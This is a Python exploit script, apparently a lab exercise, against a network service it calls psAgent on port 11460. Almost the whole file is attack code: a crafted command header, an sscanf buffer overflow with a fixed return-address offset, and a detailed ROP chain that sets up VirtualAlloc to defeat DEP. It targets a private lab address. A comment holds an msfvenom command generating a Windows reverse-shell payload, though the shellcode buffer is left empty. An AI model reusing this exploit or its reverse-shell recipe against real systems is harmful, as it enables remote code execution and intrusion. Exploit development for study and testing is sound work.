# snowcra5h@icloud.com

import socket
import sys
import struct

CB_SSCANF = len("File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d")
CB_PSAGENTBUFFER = 0x600
OFFSET_EIP = 276


def CreatePsAgentCommandHeader(opcode: int) -> str:
    psAgentCommandHeader = b""
    n = 12
    for i in range(1, n+1):
        val = 0x40 + i
        if val == 0x44:
            psAgentCommandHeader += struct.pack("<i", opcode)   # OUR OPCODE

        elif val == 0x45:                                       # FIRST MEMCPY
            # OFFSET: at 0056C8F1 offset added to &psAgentCommand. used as the const void* src argument for a memcpy
            psAgentCommandHeader += struct.pack("<i", 0x00)
        elif val == 0x46:
            # SIZE: at 0056C8DA size used as size_t sz for the 0x45 src buffer ; value can't be negative
            psAgentCommandHeader += struct.pack("<i",
                                                CB_PSAGENTBUFFER + CB_SSCANF)

        elif val == 0x47:                                       # SECOND MEMCPY
            # OFFSET: at 0056c92c offset added to &psAgentCommand. used as the const void* src argument for a memcpy
            psAgentCommandHeader += struct.pack("<i", 0x0)
        elif val == 0x48:
            # SIZE: at 0056C91F size used as size_t sz of the second src buffer ; value can't be negative
            psAgentCommandHeader += struct.pack("<i",
                                                CB_PSAGENTBUFFER + CB_SSCANF)

        elif val == 0x49:                                       # THIRD MEMCPY
            # OFFSET: at 0056C972 offset added to &psAgentCommand. used as the const void* src argument for a memcpy
            psAgentCommandHeader += struct.pack("<i", 0x0)
        elif val == 0x4a:
            # SIZE: at 0056C965 size used as size_t sz of the ???? src buffer ; maybe this value can be negative !
            psAgentCommandHeader += struct.pack("<i",
                                                CB_PSAGENTBUFFER + CB_SSCANF)

        else:
            psAgentCommandHeader += bytes([val]) * 4

    return psAgentCommandHeader

# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f python –e x86/shikata_ga_nai -b "\x00\x09\x0A\x0B\x0C\x0D\x20"


def GetShellCode() -> str:
    buf = b""

    return buf


def GetVirtualAllocPlaceHolder() -> str:
    va = struct.pack("<L", (0x45454545))   # 0x14 dummy VirutalAlloc Address
    va += struct.pack("<L", (0x46464646))  # 0x10 Shellcode Return Address
    va += struct.pack("<L", (0x47474747))  # 0x0c dummy Shellcode Address
    va += struct.pack("<L", (0x48484848))  # 0x08 dummy dwSize
    va += struct.pack("<L", (0x49494949))  # 0x04 dummy flAllocationType
    va += struct.pack("<L", (0x51515151))  # 0x0 dummy flProtect

    return va


def BuildRopChainVirtualAlloc() -> str:
    # get the address of our stack
    # push esp ; push eax ; pop edi ; pop esi ; ret
    ropChain = struct.pack('<L', (0x50501110))
    ropChain += struct.pack('<L', (0x5050118e))  # mov eax, esi ; pop esi ; ret
    ropChain += struct.pack('<L', (0x41414141))

    # set the stack offset to the start of our GetVirtualAllocPlaceHolder
    ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
    ropChain += struct.pack("<L", (0xffffffe4))  # -0x1C
    ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret
    ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

    # put the actual address of VirtualAlloc into the current offset for GetVirtualAllocPlaceHolder
    ropChain += struct.pack('<L', (0x5053a0f5))  # pop eax ; ret
    ropChain += struct.pack('<L', (0x5054A221))  # 5054A220 + 1 VirtualAlloc
    ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
    ropChain += struct.pack("<L", (0xffffffff))  # -1
    ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret
    ropChain += struct.pack('<L', (0x5051f278))  # mov eax, dword [eax] ; ret
    ropChain += struct.pack('<L', (0x5051cbb6))  # mov dword [esi], eax ; ret
    ropChain += struct.pack('<L', (0x5050118e))  # mov eax, esi ; pop esi ; ret
    ropChain += struct.pack('<L', (0x41414141))

    return ropChain


def BuildRopChainShellCodeRet() -> str:
    # increment the stack to ShellCodeRet
    ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

    # put a copy of our current stack address in esi
    ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

    # This is an offset of cbRopchain + n from the address of [Shellcode Return Address] on the stack.
    ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
    ropChain += struct.pack('<L', (0xfffffea4))  # offset
    ropChain += struct.pack('<L', (0x50533bea))  # sub eax, ecx ; ret
    ropChain += struct.pack('<L', (0x5051cbb6))  # mov dword [esi], eax ; ret
    ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret

    return ropChain


def BuildRopChainShellCodeAddr() -> str:
    # increment the stack to ShellCodeAddr
    ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

    # put a copy of our current stack address in esi
    ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

    # This is an offset of from where we are to the address of [Shellcode Return Address] on the stack.
    ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
    ropChain += struct.pack('<L', (0xfffffea8))  # offset
    ropChain += struct.pack('<L', (0x50533bea))  # sub eax, ecx ; ret
    ropChain += struct.pack('<L', (0x5051cbb6))  # mov dword [esi], eax ; ret
    ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret

    return ropChain


def BuilRopChainDwSize() -> str:
    # increment the stack to dwSize
    ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

    # put a copy of our current stack address in esi
    ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

    # put the value 0x1000 into our stack address dwSize
    ropChain += struct.pack('<L', (0x5053a0f5))  # pop eax ; ret
    ropChain += struct.pack('<L', (0xffffffff))
    ropChain += struct.pack('<L', (0x5051d0ec))  # neg eax ; ret
    ropChain += struct.pack('<L', (0x5051cbb6))  # mov dword [esi], eax ; ret
    ropChain += struct.pack('<L', (0x5050118e))  # mov eax, esi ; pop esi ; ret
    ropChain += struct.pack('<L', (0x41414141))

    return ropChain


def BuildRopChainFlAllocationType() -> str:
    # increment the stack to FlAllocationType
    ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

    # put a copy of our current stack address in esi
    ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

    # bp 0x50514394 ".if (@ecx & 0x0`ffffffff) = 0x41414141 {} .else {gc}"
    # put the value 0x1000 into our stack address FlAllocationType
    ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
    ropChain += struct.pack('<L', (0xbebecebf))
    ropChain += struct.pack('<L', (0x505412f9))  # mov eax, ecx ; ret
    ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
    ropChain += struct.pack('<L', (0x41414141))
    ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret
    ropChain += struct.pack('<L', (0x5051cbb6))  # mov dword [esi], eax ; ret
    ropChain += struct.pack('<L', (0x5050118e))  # mov eax, esi ; pop esi ; ret
    ropChain += struct.pack('<L', (0x41414141))

    return ropChain


def BuildRopChainFlProtect() -> str:
    # increment the stack to FlProtec
    ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
    ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

    # put a copy of our current stack address in esi
    ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

    # put the value 0x40 into our stack address FlProtec
    ropChain += struct.pack('<L', (0x5053a0f5))  # pop eax ; ret
    ropChain += struct.pack('<L', (0xffffffc0))
    ropChain += struct.pack('<L', (0x5051d0ec))  # neg eax ; ret
    ropChain += struct.pack('<L', (0x5051cbb6))  # mov dword [esi], eax ; ret

    return ropChain


def buildRopChain() -> str:
    ropChain = BuildRopChainVirtualAlloc()
    ropChain += BuildRopChainShellCodeRet()
    ropChain += BuildRopChainShellCodeAddr()
    ropChain += BuilRopChainDwSize()
    ropChain += BuildRopChainFlAllocationType()
    ropChain += BuildRopChainFlProtect()

    # Assume esi has the stack address at the end of our function call on the stack
    ropChain += struct.pack("<L", (0x5050118e))  # mov eax,esi ; pop esi ; retn
    ropChain += struct.pack("<L", (0x41414141))  # junk
    ropChain += struct.pack("<L", (0x505115a3))  # pop ecx ; ret
    ropChain += struct.pack("<L", (0xffffffe8))  # negative offset value
    ropChain += struct.pack("<L", (0x5051579a))  # add eax, ecx ; ret
    ropChain += struct.pack("<L", (0x5051571f))  # xchg eax, ebp ; ret
    ropChain += struct.pack("<L", (0x50533cbf))  # mov esp, ebp ; pop ebp ; ret
    ropChain += b"\x90" * 0x24

    return ropChain


def CreatePsAgentBuffer() -> str:
    virtualAlloc = GetVirtualAllocPlaceHolder()
    headPadding = b"\x90" * (OFFSET_EIP - len(virtualAlloc))
    ropChain = buildRopChain()
    shellCode = GetShellCode()

    tailPadding = b"\x90" * \
        (CB_PSAGENTBUFFER - (len(headPadding) +
         len(virtualAlloc) + len(ropChain) + len(shellCode)))

    psCommandBuffer = headPadding + virtualAlloc + ropChain + shellCode + tailPadding

    return psCommandBuffer


def ConnectServerGetSocket(server: str, port: int) -> socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    return s


def SendPayloadCloseSocket(s: str, payload: str):
    s.send(payload)
    print("[+] Packet sent")
    s.close()


def main():
    opcode = 0x534

    psAgentBuffer = CreatePsAgentBuffer()
    psAgentCommandHeader = CreatePsAgentCommandHeader(opcode)
    sscanfSploitPsAgentBuffer = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (
        psAgentBuffer, 0, 0, 0, 0
    )

    payload = psAgentCommandHeader + sscanfSploitPsAgentBuffer
    cbPayload = struct.pack(">I", len(payload))  # size needed in first 4 bytes
    payload = cbPayload + payload

    socket = ConnectServerGetSocket("192.168.247.10", 11460)
    SendPayloadCloseSocket(socket, payload)

    sys.exit(0)


if __name__ == "__main__":
    main()
